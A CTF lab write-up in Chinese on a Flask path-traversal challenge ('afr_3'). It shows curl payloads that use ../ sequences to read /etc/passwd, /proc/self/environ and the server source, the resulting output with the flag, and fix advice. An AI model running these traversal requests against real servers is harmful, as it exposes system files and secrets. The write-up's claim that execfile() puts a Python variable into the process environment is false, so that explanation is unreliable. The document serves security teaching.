---
title: "[afr_3] Flask Session + LFI 路径穿越"
date: 2026-07-08
categories:
  - CTF
  - WEB
tags:
  - CTF
  - Flask
  - LFI
  - 路径穿越
  - /proc/self/environ
---

# 1. 题目分析

**题目名称**：afr_3

**题目描述**：N1BOOK WEB入门第5题，afr系列第三题。题目延续 afr 系列的文件读取主题，服务器为 OpenResty (Nginx)，后端为 Flask 框架。

**靶机地址**：`https://21030e3d9bdfbf0084957e37.http-ctf2.dasctf.com/`

**初始访问**：首页是一个表单，POST 提交到 `/n1page`，参数名为 `n1code`。

# 2. 信息收集

## 2.1 获取 HTTP 响应头和页面内容

```bash
curl -s -i "https://TARGET/"
```

**响应头关键信息**：

| 响应头 | 值 | 推断 |
|--------|-----|------|
| `Server` | `openresty` | Nginx 系 Web 服务器 |
| `Content-Type` | `text/html; charset=utf-8` | 标准 HTML 页面 |

**页面源码**：

```html
<h1>Welcome to N1 Page</h1>
<br>
<form method="post" action="n1page">
Your name: <input name="n1code">
<br><input type="submit"><br>
</form>
```

## 2.2 测试表单提交

```bash
curl -s -i "https://TARGET/n1page" -d "n1code=test"
```

**响应**：

```
<h1>N1 Page</h1>
Hello : test, why you don't look at our <a href='/article?name=article'>article</a>?
```

**发现两个关键线索**：
1. 输入值 `test` 被直接回显在页面中
2. 页面提示访问 `/article?name=article`，这是一个文件读取接口

**Set-Cookie**：
```
session=eyJuMWNvZGUiOm51bGx9.xxx.xxx; HttpOnly; Path=/
```

解码 session payload（Base64）：
```bash
echo "eyJuMWNvZGUiOm51bGx9" | base64 -d
# 输出：{"n1code":null}
```

确认为 Flask Session，存储了 `n1code` 参数。

## 2.3 测试 SSTI（排除）

```bash
curl -s -i "https://TARGET/n1page" -d "n1code={{7*7}}"
```

**响应**：`Hello : 7*7`（输出原文 7*7，而非 49）

**结论**：`{{}}` 未被模板引擎解析，排除 SSTI（Server-Side Template Injection）。

# 3. 漏洞分析

## 3.1 推理链

```
线索 1：响应头 Server: openresty → Nginx 系服务器
  ↓
线索 2：Set-Cookie 为 Flask session 格式 → 后端是 Flask (Python)
  ↓
线索 3：/article?name=article 返回文章内容 → 参数化文件读取
  ↓
假设 1：存在 LFI（Local File Inclusion）路径穿越漏洞
  ↓
验证 1：curl /article?name=../flag → 返回 "no permission!"
  ↓
分析：不是 "not found"，而是 "no permission" — 说明文件存在但有过滤
  ↓
验证 2：curl /article?name=app.py → 返回详细错误信息
  ↓
    错误：No such file or directory: '/home/nu11111111l/articles/app.py'
  ↓
结论：基础路径为 /home/nu11111111l/articles/，name 参数直接拼接到路径中
  ↓
验证 3：curl /article?name=../../../proc/self/environ → 返回进程环境变量
  ↓
发现：FLAG=CTF2{...} 存储在环境变量中！
```

## 3.2 判断漏洞类型

**漏洞**：LFI 路径穿越（Path Traversal）

**漏洞位置**：`/article` 端点的 `name` 参数

**保护机制**：源码中存在对 "flag" 字符串的过滤

```python
if page.find('flag') >= 0:
    page = 'notallowed.txt'
```

**绕过方法**：读取 `/proc/self/environ`（进程环境变量），该路径不含 "flag" 字符串，但环境变量中存储了 `FLAG`。

## 3.3 源码分析

通过 `../../../home/sssssserver/server.py` 读取到完整源码：

```python
@app.route('/article', methods=['GET'])
def article():
    error = 0
    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = 'article'
    if page.find('flag') >= 0:        # ← 过滤 "flag" 字符串
        page = 'notallowed.txt'
    try:
        template = open('/home/nu11111111l/articles/{}'.format(page)).read()  # ← 路径穿越！
    except Exception as e:
        template = e
    return render_template('article.html', template=template)
```

**漏洞根因**：
1. `name` 参数直接拼接到文件路径 `open()` 中，未做路径规范化
2. 只过滤了包含 `flag` 的字符串，未阻止路径穿越
3. 攻击者可读取任意系统文件

**关键代码解读**：

```python
# 原始逻辑
execfile('flag.py')  # 读取 flag.py，定义变量 flag
FLAG = flag           # 将 flag 值存入 FLAG 变量（即环境变量）
app.secret_key = key
```

`execfile('flag.py')` 执行了 `flag.py` 文件，该文件的内容类似 `flag = "CTF2{...}"`。这个值被赋给 `FLAG` 变量，在 Linux 进程环境中可见。

## 3.4 ASCII 图解：正常请求 vs 攻击请求

```
正常请求：/article?name=article
┌─────────────────────────────────────────────────┐
│ name = article                                  │
│          ↓ 直接拼接到基础路径                     │
│ 文件路径: /home/nu11111111l/articles/article     │
│          ↓ open() 读取                          │
│ 结果:   "THIS IS A SAMPLE ARTICLE!" ✅           │
└─────────────────────────────────────────────────┘

被拦截的请求：/article?name=../flag
┌─────────────────────────────────────────────────┐
│ name = ../flag                                  │
│          ↓ find('flag') >= 0 → 触发过滤          │
│ name = 'notallowed.txt'  ← 被替换！              │
│ 文件路径: /home/nu11111111l/articles/notallowed.txt│
│ 结果:   "no permission!" ❌                      │
└─────────────────────────────────────────────────┘

成功的绕过：/article?name=../../../proc/self/environ
┌─────────────────────────────────────────────────┐
│ name = ../../../proc/self/environ               │
│          ↓ find('flag') → -1 → 不触发过滤        │
│          ↓ 路径穿越生效                           │
│ 文件路径: /home/nu11111111l/articles/../../../proc/self/environ│
│          → /proc/self/environ ✅                 │
│          ↓ open() 读取                          │
│ 结果:   环境变量内容，包含 FLAG=CTF2{...} 🎯     │
└─────────────────────────────────────────────────┘
```

## 3.5 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| `n1code={{7*7}}` | 输出 49 | 输出原文 7*7 | 不是 SSTI |
| `/article?name=../flag` | 读取 flag 文件 | "no permission!" | flag 字符串被过滤 |
| `/article?name=../../flag` | 读取上层 flag | "no permission!" | 同上（含 "flag"） |
| `/article?name=../app.py` | 读取源码 | No such file | 源码不在上级目录 |
| 枚举 robots.txt/.git 等 | 发现隐藏文件 | 命令执行问题 | 非枚举方向 |

# 4. 漏洞利用

## 4.1 PoC：验证路径穿越

```bash
curl -s "https://TARGET/article?name=../../../etc/passwd"
```

## 4.2 读取进程环境变量（获取 Flag）

```bash
curl -s "https://TARGET/article?name=../../../proc/self/environ"
```

**输出（关键部分）**：

```
HOME=/root
PWD=/home/sssssserver
FLAG=CTF2{5e04f572-a6fe-426c-8b73-5a157702029a}
```

## 4.3 读取服务器源码（溯源）

```bash
# 从 PWD 环境变量得知工作目录
curl -s "https://TARGET/article?name=../../../home/sssssserver/server.py"
```

**源码关键发现**：

```python
execfile('flag.py')         # 执行 flag.py，将 flag 值导入进程环境
execfile('key.py')          # 执行 key.py，获取 Flask secret_key

FLAG = flag                  # flag 值存入变量
app.secret_key = key         # 密钥存入 app 配置

@app.route('/article', methods=['GET'])
def article():
    if page.find('flag') >= 0:   # 仅过滤文件名中的 "flag"
        page = 'notallowed.txt'
    template = open('/home/nu11111111l/articles/{}'.format(page)).read()
    # ↑ 未对路径进行规范化，存在路径穿越
```

## 4.4 其他可读取的敏感信息

```bash
# 进程命令行
curl -s "https://TARGET/article?name=../../../proc/self/cmdline"
# 输出：python server.py

# 进程状态
curl -s "https://TARGET/article?name=../../../proc/self/status"
```

# 5. Flag

```
CTF2{5e04f572-a6fe-426c-8b73-5a157702029a}
```

**获取方式**：通过 `/article` 端点的 LFI 路径穿越漏洞，读取 `/proc/self/environ` 获取进程环境变量中的 FLAG。

# 6. 知识点总结

## 6.1 技术点

| 技术点 | 说明 |
|--------|------|
| **LFI 路径穿越** | 用户输入直接拼接到文件路径 `open()` 中，未做路径规范化 |
| **黑名单绕过** | `find('flag')` 仅过滤参数中含 "flag" 的请求，读取 `/proc/self/environ` 可绕过 |
| **Flask Session** | Flask 默认使用客户端 Cookie 存储 Session，可通过 Base64 解码查看内容 |
| **`/proc/self/environ`** | Linux 下每个进程的环境变量暴露在该文件中，包含进程启动时的所有环境变量值 |
| **`execfile()` 副作用** | Python 2 的 `execfile()` 会在当前命名空间中执行文件，变量会暴露到进程环境 |

## 6.2 修复建议

1. **路径规范化**：使用 `os.path.realpath()` 解析真实路径，拒绝不安全的路径
   ```python
   import os
   base = '/home/nu11111111l/articles/'
   full_path = os.path.realpath(os.path.join(base, page))
   if not full_path.startswith(base):
       return "Access denied"
   ```

2. **白名单控制**：限制 `name` 参数只能访问预定义的文件列表，而非任意文件路径

3. **避免敏感信息暴露在环境变量**：不应通过 `execfile()` 将 flag 值导入全局变量/环境

4. **升级到 Python 3**：`execfile()` 在 Python 3 中已废弃（不影响本题漏洞核心）

## 6.3 与 afr_1 / afr_2 的对比

| 对比维度 | afr_1 | afr_2 | afr_3 |
|---------|-------|-------|-------|
| **漏洞类型** | PHP LFI (php://filter) | Nginx alias 路径穿越 | Flask LFI + 黑名单绕过 |
| **服务端** | Apache + PHP | OpenResty (Nginx) | OpenResty + Flask (Python) |
| **过滤方式** | 无（直接拼接） | 无（Nginx 配置层漏洞） | 黑名单过滤 "flag" 字符串 |
| **Flag 位置** | 文件系统中 | `/flag` 文件 | 环境变量 `/proc/self/environ` |
| **绕过技巧** | `php://filter` 伪协议 | `/img../` Nginx alias 特性 | 读取 env 绕过文件名过滤 |

# 7. 解题链路总结图

```
┌─────────────────────────────────┐
│ GET / → 首页表单                 │
│ 发现 POST /n1page, n1code 参数   │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ POST /n1page n1code=test        │
│ → 回显输入 + 提示 /article 链接  │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ 测试 SSTI: n1code={{7*7}}       │
│ → 输出原文 "7*7" → 不是 SSTI    │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ GET /article?name=article       │
│ → 返回文章内容 → 文件读取接口！   │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ 测试 LFI: name=../flag          │
│ → "no permission!" → 被过滤     │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ 测试 LFI: name=app.py           │
│ → 报错暴露路径:                  │
│   /home/nu11111111l/articles/   │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ name=../../../proc/self/environ │
│ → 绕过 flag 过滤 → 读到环境变量  │
│ → FLAG=CTF2{5e04f572-...} 🎯   │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ 溯源: 读取 server.py 源码        │
│ → 确认漏洞根因:                  │
│   open() 路径直接拼接 +          │
│   find('flag') 黑名单过滤不足    │
└─────────────────────────────────┘
```
